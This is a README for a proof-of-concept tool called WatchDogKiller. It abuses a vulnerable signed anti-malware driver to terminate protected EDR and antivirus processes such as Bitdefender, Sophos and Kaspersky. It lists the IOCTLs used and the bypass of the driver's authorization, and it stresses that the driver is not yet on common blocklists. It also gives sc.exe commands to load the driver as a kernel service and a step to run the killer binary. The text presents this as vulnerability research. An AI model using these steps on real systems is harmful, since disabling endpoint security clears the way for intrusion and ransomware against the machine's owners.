# WatchDogKiller ‚Äì Weaponizing the WatchDog Anti-Malware Driver Vulnerability

## üìñ Research Article
This repository is the Proof-of-Concept (PoC) accompanying my technical write-up on the WatchDog Anti-Malware (amsdk.sys) BYOVD vulnerability.  
üëâ Full research available here: [Researching an APT Attack and Weaponizing It: The WatchDog BYOVD Story](https://medium.com/@jehadbudagga/researching-an-apt-attack-and-weaponizing-it-56daabee11c9)

## ‚ö° Overview
The Silver Fox APT group leveraged a vulnerable Microsoft-signed driver (`wamsdk.sys`) in recent attacks to disable security products.  
I reversed the latest WatchDog driver (`amsdk.sys v1.1.100`) and discovered that the arbitrary process termination vulnerability was still exploitable.

The driver as of this date 11/9/2025 isnt listed on either LolDriver or HVCI blocked

This PoC demonstrates:
- Registering a process with the driver (`IOCTL_REGISTER_PROCESS`)
- Using the termination routine (`IOCTL_TERMINATE_PROCESS`)
- Bypassing the driver‚Äôs authorization mechanism
- Killing protected EDR/AV processes (Bitdefender, Sophos, Kaspersky, etc.)

## üõ†Ô∏è Usage
> ‚ö†Ô∏è **Disclaimer**: This code is for educational and research purposes only. Do not use it on systems you do not own.

1. Load the vulnerable driver:
   ```powershell
   sc.exe create killer binPath="C:\Path\To\wamsdk.sys" type=kernel
   sc.exe start killer
   ```

 2. Run the PoC
```
.\WatchDogKiller.exe
